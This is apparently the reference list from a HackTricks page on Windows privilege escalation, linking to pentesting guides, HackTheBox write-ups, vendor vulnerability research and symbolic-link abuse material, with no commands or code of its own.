- [https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections)

- [0xdf – HTB/VulnLab JobTwo: Word VBA macro phishing via SMTP → hMailServer credential decryption → Veeam CVE-2023-27532 to SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) and kernel token theft](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)

- [Check Point Research – Chasing the Silver Fox: Cat & Mouse in Kernel Shadows](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [Unit 42 – Privileged File System Vulnerability Present in a SCADA System](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [Symbolic Link Testing Tools – CreateSymlink usage](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [A Link to the Past. Abusing Symbolic Links on Windows](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)

{{#include ../../banners/hacktricks-training.md}}
